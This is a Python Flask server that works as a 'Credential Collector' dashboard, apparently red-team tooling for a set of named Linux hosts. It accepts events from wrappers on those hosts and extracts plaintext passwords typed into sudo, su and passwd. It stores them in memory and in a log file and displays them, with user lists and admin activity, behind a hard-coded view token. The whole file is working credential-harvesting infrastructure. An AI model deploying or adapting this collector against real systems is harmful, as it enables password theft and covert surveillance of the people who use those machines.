#!/usr/bin/env python3
from flask import Flask, request, jsonify
from datetime import datetime, timezone, timedelta
import os, json, threading

EST = timezone(timedelta(hours=-4))

def _now_est():
    return datetime.now(EST).strftime("%Y-%m-%d %H:%M:%S EST")

app = Flask(__name__)

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "creds.log")
VIEW_TOKEN = "chumbucket"

LINUX_HOSTS = {
    "10.111.1.1": "shellphone",
    "10.111.1.2": "bottlemail",
    "10.111.1.3": "pattyvault",
    "10.111.1.4": "thesafe",
    "10.111.1.5": "krustyfront",
}

CRED_EVENT_TYPES = {"sudo", "passwd_self", "passwd_other", "su"}

cred_store    = {}
event_log     = {}
warning_store = {}
user_store    = {}
store_lock    = threading.Lock()


def _extract_password(event_type, data):
    if event_type in ("sudo", "su"):
        return data.get("password", "")
    if event_type in ("passwd_self", "passwd_other"):
        return data.get("new_password", "")
    return ""

def _extract_cred_user(event_type, user, data):
    if event_type in ("passwd_other", "su"):
        return data.get("target_user", user)
    return user


def _upsert(event: dict, persist=True):
    host     = event.get("host_ip", "unknown")
    user     = event.get("user", "unknown")
    etype    = event.get("event_type", "unknown")
    received = event.get("received_at", _now_est())
    data     = event.get("data", {})

    with store_lock:
        if etype in CRED_EVENT_TYPES:
            pw = _extract_password(etype, data)
            cred_user = _extract_cred_user(etype, user, data)
            if pw:
                if host not in cred_store:
                    cred_store[host] = {}
                cred_store[host][cred_user] = {
                    "password":    pw,
                    "source":      etype,
                    "received_at": received,
                }

        if host not in event_log:
            event_log[host] = {}
        if etype not in event_log[host]:
            event_log[host][etype] = []
        event_log[host][etype].insert(0, {
            "user":        user,
            "data":        data,
            "received_at": received,
            "host_ts":     event.get("host_ts", ""),
        })

    if persist:
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(event) + "\n")


def load_log():
    if not os.path.exists(LOG_FILE):
        return
    with open(LOG_FILE) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                _upsert(json.loads(line), persist=False)
            except Exception:
                pass


@app.route("/status", methods=["POST"])
def receive_status():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"ok": False}), 400
    host     = data.get("host_ip", "unknown")
    event    = data.get("event", "unknown")
    ts       = data.get("timestamp", "")
    received = _now_est()
    with store_lock:
        warning_store[host] = {
            "event":       event,
            "timestamp":   ts,
            "received_at": received,
        }
    return jsonify({"ok": True}), 200


@app.route("/status/clear", methods=["POST"])
def clear_status():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"ok": False}), 400
    host = data.get("host_ip", "")
    if not host:
        return jsonify({"ok": False, "error": "host_ip required"}), 400
    with store_lock:
        warning_store.pop(host, None)
    return jsonify({"ok": True}), 200



@app.route("/sync", methods=["POST"])
def receive_sync():
    """Receive user enumeration snapshot from a wrapper (no passwords)."""
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"ok": False}), 400
    host  = data.get("host_ip", "unknown")
    users = data.get("users", [])
    if not isinstance(users, list):
        return jsonify({"ok": False}), 400
    received = _now_est()
    with store_lock:
        user_store[host] = {
            "users":       users,
            "received_at": received,
        }
    return jsonify({"ok": True}), 200

@app.route("/log", methods=["POST"])
def receive_event():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"ok": False}), 400

    event = {
        "host_ip":     data.get("host_ip") or data.get("host", "unknown"),
        "user":        data.get("user", "unknown"),
        "event_type":  data.get("event_type", "unknown"),
        "host_ts":     data.get("timestamp", ""),
        "received_at": _now_est(),
        "data":        data.get("data", {}),
    }
    _upsert(event)
    return jsonify({"ok": True}), 200


ACTIVITY_LABELS = {
    "sudo":         "Sudo",
    "passwd_self":  "Password Change (self)",
    "passwd_other": "Password Change (other)",
    "su":           "Su",
    "ssh":          "SSH",
    "useradd":      "User Added",
    "userdel":      "User Deleted",
    "usermod":      "User Modified",
    "visudo":       "Visudo",
    "systemctl":    "Systemctl",
    "ufw":          "UFW",
    "iptables":     "Iptables",
}

ACTIVITY_ICONS = {
    "sudo":         "🔑",
    "passwd_self":  "🔒",
    "passwd_other": "🔒",
    "su":           "👤",
    "ssh":          "🔗",
    "useradd":      "➕",
    "userdel":      "➖",
    "usermod":      "✏️",
    "visudo":       "📝",
    "systemctl":    "⚙️",
    "ufw":          "🛡️",
    "iptables":     "🛡️",
}

def esc(s):
    """Minimal HTML escape."""
    return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"','&quot;')

def render_activity_detail(etype, d):
    if etype == "sudo":
        cmd = esc(d.get("command", ""))
        return f'ran <code>{cmd}</code>'
    if etype == "passwd_self":
        return "changed own password"
    if etype == "passwd_other":
        target = esc(d.get("target_user", "?"))
        return f'changed password for <strong>{target}</strong>'
    if etype == "su":
        target = esc(d.get("target_user", "?"))
        return f'switched to <strong>{target}</strong>'
    if etype == "ssh":
        dest = esc(d.get("destination", "?"))
        dest_user = esc(d.get("dest_user", ""))
        dest_str = f"{dest_user}@{dest}" if dest_user else dest
        return f'connected to <strong>{dest_str}</strong>'
    if etype == "useradd":
        new_user = esc(d.get("new_user", d.get("args", "")))
        via = f' <span class="via">via {esc(d["via"])}</span>' if "via" in d else ""
        return f'created account <strong>{new_user}</strong>{via}'
    if etype == "userdel":
        del_user = esc(d.get("deleted_user", d.get("args", "")))
        return f'deleted account <strong>{del_user}</strong>'
    if etype == "usermod":
        target = esc(d.get("target_user", "?"))
        parts = []
        if d.get("groups"):      parts.append(f'groups → {esc(d["groups"])}')
        if d.get("new_home"):    parts.append(f'home → {esc(d["new_home"])}')
        if d.get("new_shell"):   parts.append(f'shell → {esc(d["new_shell"])}')
        if d.get("new_login"):   parts.append(f'login → {esc(d["new_login"])}')
        if d.get("lock_action"): parts.append(esc(d["lock_action"]))
        detail = ", ".join(parts) if parts else esc(d.get("full_args", ""))
        return f'modified <strong>{target}</strong>: {detail}'
    if etype == "visudo":
        return "edited sudoers"
    if etype == "systemctl":
        action = esc(d.get("action", ""))
        units  = esc(d.get("units", ""))
        rc     = d.get("exit_code", "")
        rc_chip = f' <span class="rc rc-{"ok" if rc == 0 else "err"}">rc={rc}</span>' if rc != "" else ""
        return f'{action} <code>{units}</code>{rc_chip}'
    if etype in ("ufw", "iptables"):
        args = esc(d.get("args", ""))
        return f'<code>{args}</code>'
    return esc(json.dumps(d))


def render_activity_section(ip, etype, entries):
    label = ACTIVITY_LABELS.get(etype, etype)
    icon  = ACTIVITY_ICONS.get(etype, "")
    total = len(entries)
    uid   = f"act_{ip.replace('.','_')}_{etype}"

    rows = ""
    for i, e in enumerate(entries):
        user   = esc(e["user"])
        ts     = esc(e["received_at"])
        detail = render_activity_detail(etype, e["data"])
        hidden_cls = ' class="extra-row"' if i >= 10 else ""
        rows += f'<tr{hidden_cls}><td class="td-user">{user}</td><td class="td-detail">{detail}</td><td class="td-time">{ts}</td></tr>'

    show_more = ""
    if total > 10:
        show_more = f'<button class="show-more-btn" onclick="toggleRows(\'{uid}\', event)" data-uid="{uid}">Show all {total}</button>'

    return f"""
    <div class="act-section" id="{uid}_wrap">
      <div class="act-header" onclick="toggleSection('{uid}_body')">
        <span class="act-toggle-icon" id="{uid}_body_chevron">▾</span>
        <span class="act-icon">{icon}</span>
        <span class="act-label">{label}</span>
        <span class="act-count">{total}</span>
      </div>
      <div class="act-body" id="{uid}_body">
        <table class="act-table">
          <thead><tr><th>User</th><th>Detail</th><th>Time (EST)</th></tr></thead>
          <tbody id="{uid}_rows">{rows}</tbody>
        </table>
        {show_more}
      </div>
    </div>"""


def render_host_card(ip, hostname):
    with store_lock:
        creds   = dict(cred_store.get(ip, {}))
        events  = {k: list(v) for k, v in event_log.get(ip, {}).items()}
        warning = dict(warning_store.get(ip, {}))
        users_snap = dict(user_store.get(ip, {}))

    has_data = bool(creds or events)
    card_id  = f"card_{ip.replace('.','_')}"
    warn_id  = f"warn_{ip.replace('.','_')}"

    # -- warning badge --
    if warning:
        warn_label = {
            "watcher_down": "⚠ Watcher offline",
        }.get(warning.get("event", ""), f"⚠ {esc(warning.get('event',''))}")
        warn_ts = esc(warning.get("received_at", ""))
        warning_html = (
            f'<span class="chip chip-warn" id="{warn_id}" title="Since {warn_ts}">'
            f'{warn_label}'
            f'</span>'
            f'<button class="warn-clear-btn" title="Dismiss warning" '
            f'onclick="clearWarning(\'{ip}\')">✕</button>'
        )
    else:
        warning_html = ""

    # -- status chip --
    if creds:
        sorted_creds = sorted(creds.items(), key=lambda x: x[1]["received_at"], reverse=True)
        last_ts = sorted_creds[0][1]["received_at"]
        status_chip = f'<span class="chip chip-live">Live</span>'
        last_seen   = f'<span class="last-seen">Last activity {esc(last_ts)}</span>'
    elif events:
        status_chip = f'<span class="chip chip-activity">Activity</span>'
        last_seen   = ""
    else:
        status_chip = f'<span class="chip chip-silent">Silent</span>'
        last_seen   = ""

    # -- credential table --
    if creds:
        cred_rows = ""
        for uname, info in sorted(creds.items(), key=lambda x: x[1]["received_at"], reverse=True):
            src = ACTIVITY_LABELS.get(info["source"], info["source"])
            cred_rows += f"""<tr>
              <td class="td-user">{esc(uname)}</td>
              <td class="td-pw">{esc(info['password'])}</td>
              <td class="td-meta">{esc(src)}</td>
              <td class="td-time">{esc(info['received_at'])}</td>
            </tr>"""
        cred_html = f"""
        <div class="cred-block">
          <div class="block-title">Captured Credentials <span class="act-count">{len(creds)}</span></div>
          <table class="cred-table">
            <thead><tr><th>User</th><th>Password</th><th>Source</th><th>Captured (EST)</th></tr></thead>
            <tbody>{cred_rows}</tbody>
          </table>
        </div>"""
    else:
        cred_html = '<div class="no-creds">No credentials captured yet.</div>'


    # -- users snapshot --
    users_data = users_snap.get("users", [])
    users_ts   = users_snap.get("received_at", "")
    if users_data:
        admin_users   = [u for u in users_data if u.get("is_admin")]
        regular_users = [u for u in users_data if not u.get("is_admin")]

        def user_row(u):
            uname = esc(u.get("username", "?"))
            uid   = esc(str(u.get("uid", "")))
            badge = ' <span class="chip chip-live" style="font-size:10px;padding:1px 5px">sudo</span>' if u.get("is_admin") else ""
            return f'<tr><td class="td-user">{uname}{badge}</td><td class="td-meta">{uid}</td></tr>'

        user_rows = "".join(user_row(u) for u in sorted(users_data, key=lambda x: (not x.get("is_admin"), x.get("username",""))))
        users_html = f"""
        <div class="cred-block">
          <div class="block-title">Users on Host <span class="act-count">{len(users_data)}</span>
            <span style="font-weight:400;font-size:11px;color:var(--text-3);margin-left:8px">as of {esc(users_ts)}</span>
          </div>
          <table class="cred-table">
            <thead><tr><th>Username</th><th>UID</th></tr></thead>
            <tbody>{user_rows}</tbody>
          </table>
        </div>"""
    else:
        users_html = ""

    # -- activity sections --
    act_html = ""
    for etype, entries in sorted(events.items()):
        if entries:
            act_html += render_activity_section(ip, etype, entries)

    if not act_html:
        act_html = '<div class="no-activity">No activity recorded.</div>'

    total_events = sum(len(v) for v in events.values())

    return f"""
  <div class="host-card" id="{card_id}">
    <div class="host-header" onclick="toggleCard('{card_id}')">
      <span class="collapse-icon" id="{card_id}_chevron">▾</span>
      <span class="host-name">{esc(hostname)}</span>
      <span class="host-ip">{esc(ip)}</span>
      {status_chip}
      {warning_html}
      <span class="host-counts">{len(creds)} cred{"s" if len(creds) != 1 else ""} &middot; {total_events} event{"s" if total_events != 1 else ""}</span>
      {last_seen}
    </div>
    <div class="host-body" id="{card_id}_body">
      {cred_html}
      {users_html}
      <div class="act-block">
        <div class="block-title">Activity</div>
        {act_html}
      </div>
    </div>
  </div>"""


@app.route("/data", methods=["GET"])
def get_data():
    """JSON endpoint for live polling — returns stats + rendered card HTML."""
    if request.args.get("token") != VIEW_TOKEN:
        return "", 404
    with store_lock:
        total_creds  = sum(len(v) for v in cred_store.values())
        total_events = sum(len(ev) for host in event_log.values() for ev in host.values())
        active_hosts = sum(
            1 for ip in set(list(cred_store.keys()) + list(event_log.keys()))
            if cred_store.get(ip) or event_log.get(ip)
        )
        all_ips = list(LINUX_HOSTS.keys())
        for ip in list(cred_store.keys()) + list(event_log.keys()):
            if ip not in all_ips:
                all_ips.append(ip)

    def last_activity(ip):
        times = []
        if ip in cred_store:
            times += [v["received_at"] for v in cred_store[ip].values()]
        if ip in event_log:
            for evlist in event_log[ip].values():
                if evlist:
                    times.append(evlist[0]["received_at"])
        return max(times) if times else ""

    active     = sorted([ip for ip in all_ips if last_activity(ip)], key=last_activity, reverse=True)
    silent     = [ip for ip in all_ips if not last_activity(ip)]
    sorted_ips = active + silent

    cards_html = "".join(render_host_card(ip, LINUX_HOSTS.get(ip, ip)) for ip in sorted_ips)

    return jsonify({
        "total_creds":  total_creds,
        "total_events": total_events,
        "active_hosts": active_hosts,
        "cards_html":   cards_html,
    })


@app.route("/", methods=["GET"])
def view_creds():
    if request.args.get("token") != VIEW_TOKEN:
        return "", 404

    all_ips = list(LINUX_HOSTS.keys())
    with store_lock:
        for ip in list(cred_store.keys()) + list(event_log.keys()):
            if ip not in all_ips:
                all_ips.append(ip)

    def last_activity(ip):
        times = []
        if ip in cred_store:
            times += [v["received_at"] for v in cred_store[ip].values()]
        if ip in event_log:
            for evlist in event_log[ip].values():
                if evlist:
                    times.append(evlist[0]["received_at"])
        return max(times) if times else ""

    active     = sorted([ip for ip in all_ips if last_activity(ip)], key=last_activity, reverse=True)
    silent     = [ip for ip in all_ips if not last_activity(ip)]
    sorted_ips = active + silent

    total_creds  = sum(len(v) for v in cred_store.values())
    total_events = sum(len(ev) for host in event_log.values() for ev in host.values())
    active_hosts = len(active)

    cards = "".join(render_host_card(ip, LINUX_HOSTS.get(ip, ip)) for ip in sorted_ips)

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Credential Collector</title>
  <style>
    *, *::before, *::after {{ box-sizing: border-box; margin: 0; padding: 0; }}

    :root {{
      --bg:          #f8f9fa;
      --surface:     #ffffff;
      --surface-2:   #f1f3f5;
      --border:      #dee2e6;
      --border-2:    #e9ecef;
      --text:        #212529;
      --text-2:      #495057;
      --text-3:      #868e96;
      --accent:      #2563eb;
      --accent-bg:   #eff6ff;
      --red:         #dc2626;
      --red-bg:      #fef2f2;
      --green:       #16a34a;
      --green-bg:    #f0fdf4;
      --yellow:      #d97706;
      --yellow-bg:   #fffbeb;
      --pw-color:    #7c3aed;
      --code-bg:     #f1f3f5;
      --radius:      8px;
      --radius-sm:   4px;
      --shadow:      0 1px 3px rgba(0,0,0,.08), 0 1px 2px rgba(0,0,0,.04);
    }}

    body {{
      background: var(--bg);
      color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      font-size: 14px;
      line-height: 1.5;
      padding: 24px;
    }}

    /* ---- top bar ---- */
    .topbar {{
      display: flex;
      align-items: center;
      gap: 16px;
      margin-bottom: 24px;
      flex-wrap: wrap;
    }}
    .topbar-title {{
      font-size: 18px;
      font-weight: 700;
      color: var(--text);
      letter-spacing: -.3px;
    }}
    .topbar-sub {{
      font-size: 12px;
      color: var(--text-3);
      margin-top: 1px;
    }}
    .stat-pills {{
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
    }}
    .stat-pill {{
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 20px;
      padding: 3px 12px;
      font-size: 12px;
      color: var(--text-2);
    }}
    .stat-pill strong {{ color: var(--text); }}
    .topbar-actions {{ margin-left: auto; display: flex; gap: 8px; }}
    .btn {{
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--radius-sm);
      padding: 6px 14px;
      font-size: 13px;
      color: var(--text-2);
      cursor: pointer;
      text-decoration: none;
      transition: background .12s;
    }}
    .btn:hover {{ background: var(--surface-2); }}
    .btn-primary {{
      background: var(--accent);
      border-color: var(--accent);
      color: #fff;
    }}
    .btn-primary:hover {{ background: #1d4ed8; }}

    /* ---- host card ---- */
    .host-card {{
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      margin-bottom: 12px;
      overflow: hidden;
    }}
    .host-header {{
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 12px 16px;
      cursor: pointer;
      user-select: none;
      border-bottom: 1px solid var(--border-2);
      background: var(--surface);
      flex-wrap: wrap;
    }}
    .host-header:hover {{ background: var(--surface-2); }}
    .collapse-icon {{
      color: var(--text-3);
      font-size: 12px;
      transition: transform .15s;
      min-width: 12px;
    }}
    .host-name {{
      font-weight: 600;
      font-size: 15px;
      color: var(--text);
    }}
    .host-ip {{
      font-size: 12px;
      color: var(--text-3);
      font-family: monospace;
    }}
    .host-counts {{
      font-size: 12px;
      color: var(--text-3);
    }}
    .last-seen {{
      font-size: 11px;
      color: var(--text-3);
      margin-left: auto;
    }}

    /* ---- chips ---- */
    .chip {{
      font-size: 11px;
      font-weight: 600;
      padding: 2px 8px;
      border-radius: 20px;
      letter-spacing: .2px;
    }}
    .chip-live     {{ background: var(--green-bg);  color: var(--green);  }}
    .chip-activity {{ background: var(--accent-bg); color: var(--accent); }}
    .chip-silent   {{ background: var(--surface-2); color: var(--text-3); }}
    .chip-warn     {{ background: var(--yellow-bg); color: var(--yellow); cursor: default; }}
    .warn-clear-btn {{
      background: none;
      border: none;
      font-size: 11px;
      color: var(--yellow);
      cursor: pointer;
      padding: 0 4px;
      opacity: .7;
    }}
    .warn-clear-btn:hover {{ opacity: 1; }}

    /* ---- host body ---- */
    .host-body {{ padding: 16px; display: flex; flex-direction: column; gap: 16px; }}

    /* ---- block titles ---- */
    .block-title {{
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: .6px;
      color: var(--text-3);
      margin-bottom: 10px;
      display: flex;
      align-items: center;
      gap: 6px;
    }}

    /* ---- credential table ---- */
    .cred-table, .act-table {{
      width: 100%;
      border-collapse: collapse;
      font-size: 13px;
    }}
    .cred-table th, .act-table th {{
      background: var(--surface-2);
      color: var(--text-3);
      font-size: 11px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: .4px;
      text-align: left;
      padding: 7px 12px;
      border-bottom: 1px solid var(--border);
    }}
    .cred-table td, .act-table td {{
      padding: 8px 12px;
      border-bottom: 1px solid var(--border-2);
      vertical-align: top;
    }}
    .cred-table tr:last-child td,
    .act-table tr:last-child td {{ border-bottom: none; }}
    .cred-table tr:hover td,
    .act-table tr:hover td {{ background: var(--surface-2); }}
    .td-user  {{ font-weight: 500; color: var(--accent); font-family: monospace; font-size: 13px; }}
    .td-pw    {{ font-weight: 700; color: var(--pw-color); font-family: monospace; font-size: 13px; }}
    .td-meta  {{ color: var(--text-3); font-size: 12px; }}
    .td-time  {{ color: var(--text-3); font-size: 12px; white-space: nowrap; }}
    .td-detail {{ color: var(--text-2); }}
    .td-detail code {{
      background: var(--code-bg);
      padding: 1px 5px;
      border-radius: 3px;
      font-size: 12px;
      word-break: break-all;
    }}

    /* ---- activity sections ---- */
    .act-section {{
      border: 1px solid var(--border-2);
      border-radius: var(--radius-sm);
      overflow: hidden;
      margin-bottom: 6px;
    }}
    .act-header {{
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 8px 12px;
      background: var(--surface-2);
      cursor: pointer;
      user-select: none;
    }}
    .act-header:hover {{ background: var(--border-2); }}
    .act-toggle-icon {{ color: var(--text-3); font-size: 11px; transition: transform .15s; min-width: 10px; }}
    .act-icon  {{ font-size: 13px; }}
    .act-label {{ font-size: 13px; font-weight: 500; color: var(--text); }}
    .act-count {{
      font-size: 11px;
      background: var(--border);
      color: var(--text-3);
      padding: 1px 7px;
      border-radius: 20px;
      font-weight: 600;
    }}
    .act-body {{ padding: 0; }}

    /* ---- extra rows / show more ---- */
    .extra-row {{ display: none; }}
    .show-more-btn {{
      display: block;
      width: 100%;
      text-align: center;
      padding: 7px;
      font-size: 12px;
      color: var(--accent);
      background: none;
      border: none;
      border-top: 1px solid var(--border-2);
      cursor: pointer;
    }}
    .show-more-btn:hover {{ background: var(--accent-bg); }}

    /* ---- misc ---- */
    .no-creds, .no-activity {{
      font-size: 13px;
      color: var(--text-3);
      padding: 6px 0;
    }}
    .via {{ color: var(--text-3); font-size: 12px; }}
    .rc {{ font-size: 11px; padding: 1px 5px; border-radius: 3px; }}
    .rc-ok  {{ background: var(--green-bg);  color: var(--green); }}
    .rc-err {{ background: var(--red-bg);    color: var(--red); }}

    /* collapsed states */
    .collapsed .host-body     {{ display: none; }}
    .collapsed .collapse-icon {{ transform: rotate(-90deg); }}
    .act-section.act-collapsed .act-body        {{ display: none; }}
    .act-section.act-collapsed .act-toggle-icon {{ transform: rotate(-90deg); }}
  </style>

  <script>
    function toggleCard(cardId) {{
      document.getElementById(cardId).classList.toggle('collapsed');
    }}

    function toggleSection(bodyId) {{
      var section = document.getElementById(bodyId).closest('.act-section');
      section.classList.toggle('act-collapsed');
    }}

    function clearWarning(ip) {{
      fetch('/status/clear', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{host_ip: ip}})
      }}).then(() => {{
        var el = document.getElementById('warn_' + ip.replace(/\./g,'_'));
        if (el) {{
          var btn = el.nextElementSibling;
          if (btn && btn.classList.contains('warn-clear-btn')) btn.remove();
          el.remove();
        }}
      }});
    }}

    function toggleRows(uid, evt) {{
      var rows = document.querySelectorAll('#' + uid + '_rows .extra-row');
      var btn  = evt.currentTarget;
      // One-time init: store original label before any toggle
      if (!btn.dataset.orig) {{
        btn.dataset.orig = btn.textContent;
        btn.dataset.showing = '0';
      }}
      var showing = btn.dataset.showing === '1';
      rows.forEach(r => r.style.display = showing ? 'none' : '');
      btn.dataset.showing = showing ? '0' : '1';
      btn.textContent = showing ? btn.dataset.orig : 'Show less';
    }}

    // Save collapsed/expanded state to localStorage, keyed by card id.
    function saveState() {{
      var state = {{}};
      document.querySelectorAll('.host-card').forEach(function(c) {{
        state[c.id] = c.classList.contains('collapsed');
      }});
      try {{ localStorage.setItem('cc_collapsed', JSON.stringify(state)); }} catch(e) {{}}
    }}

    function loadState() {{
      try {{ return JSON.parse(localStorage.getItem('cc_collapsed') || '{{}}'); }} catch(e) {{ return {{}}; }}
    }}

    function applyState(state) {{
      document.querySelectorAll('.host-card').forEach(function(c) {{
        if (state[c.id] === true)  c.classList.add('collapsed');
        if (state[c.id] === false) c.classList.remove('collapsed');
      }});
    }}

    // Wrap toggleCard so it persists state
    var _origToggleCard = toggleCard;
    toggleCard = function(cardId) {{
      _origToggleCard(cardId);
      saveState();
    }};

    function collapseAll() {{
      document.querySelectorAll('.host-card').forEach(c => c.classList.add('collapsed'));
      saveState();
    }}
    function expandAll() {{
      document.querySelectorAll('.host-card').forEach(c => c.classList.remove('collapsed'));
      saveState();
    }}

    function manualRefresh() {{
      var TOKEN = '{VIEW_TOKEN}';
      fetch('/data?token=' + TOKEN)
        .then(function(r) {{ return r.ok ? r.json() : null; }})
        .then(function(d) {{
          if (!d) return;
          var pills = document.querySelectorAll('.stat-pill');
          if (pills.length >= 3) {{
            pills[0].innerHTML = '<strong>' + d.total_creds  + '</strong> credential'  + (d.total_creds  !== 1 ? 's' : '');
            pills[1].innerHTML = '<strong>' + d.total_events + '</strong> event'       + (d.total_events !== 1 ? 's' : '');
            pills[2].innerHTML = '<strong>' + d.active_hosts + '</strong> active host' + (d.active_hosts !== 1 ? 's' : '');
          }}
          if (d.cards_html) {{
            var state = {{}};
            document.querySelectorAll('.host-card').forEach(function(c) {{
              state[c.id] = c.classList.contains('collapsed');
            }});
            document.getElementById('cards-container').innerHTML = d.cards_html;
            applyState(state);
            try {{ localStorage.setItem('cc_collapsed', JSON.stringify(state)); }} catch(e) {{}}
          }}
        }})
        .catch(function() {{}});
    }}

    // Apply saved state on initial load
    document.addEventListener('DOMContentLoaded', function() {{ applyState(loadState()); }});

    // Live poll: update pills + re-render cards every 20s, preserving collapse state.
    (function startPolling() {{
      var TOKEN = '{VIEW_TOKEN}';

      function updatePills(d) {{
        var pills = document.querySelectorAll('.stat-pill');
        if (pills.length < 3) return;
        pills[0].innerHTML = '<strong>' + d.total_creds  + '</strong> credential'  + (d.total_creds  !== 1 ? 's' : '');
        pills[1].innerHTML = '<strong>' + d.total_events + '</strong> event'       + (d.total_events !== 1 ? 's' : '');
        pills[2].innerHTML = '<strong>' + d.active_hosts + '</strong> active host' + (d.active_hosts !== 1 ? 's' : '');
      }}

      function updateCards(html) {{
        var state = loadState();
        // Also capture current DOM state (user may have toggled since last save)
        document.querySelectorAll('.host-card').forEach(function(c) {{
          state[c.id] = c.classList.contains('collapsed');
        }});
        var container = document.getElementById('cards-container');
        if (container) container.innerHTML = html;
        applyState(state);
      }}

      setInterval(function() {{
        fetch('/data?token=' + TOKEN)
          .then(function(r) {{ return r.ok ? r.json() : null; }})
          .then(function(d) {{
            if (!d) return;
            updatePills(d);
            if (d.cards_html) updateCards(d.cards_html);
          }})
          .catch(function() {{}});
      }}, 5000);
    }})();
  </script>
</head>
<body>

  <div class="topbar">
    <div>
      <div class="topbar-title">Credential Collector</div>
      <div class="topbar-sub">Chum Bucket &mdash; live</div>
    </div>
    <div class="stat-pills">
      <div class="stat-pill"><strong>{total_creds}</strong> credential{"s" if total_creds != 1 else ""}</div>
      <div class="stat-pill"><strong>{total_events}</strong> event{"s" if total_events != 1 else ""}</div>
      <div class="stat-pill"><strong>{active_hosts}</strong> active host{"s" if active_hosts != 1 else ""}</div>
    </div>
    <div class="topbar-actions">
      <button class="btn" onclick="collapseAll()">Collapse all</button>
      <button class="btn" onclick="expandAll()">Expand all</button>
      <button class="btn btn-primary" onclick="manualRefresh()">Refresh</button>
    </div>
  </div>

  <div id="cards-container">
  {cards}
  </div>

</body>
</html>"""


if __name__ == "__main__":
    load_log()
    print(f"Credential collector starting on http://0.0.0.0:9001")
    print(f"View UI at: http://0.0.0.0:9001/?token={VIEW_TOKEN}")
    print(f"Logging to: {LOG_FILE}")
    app.run(host="0.0.0.0", port=9001, debug=False)
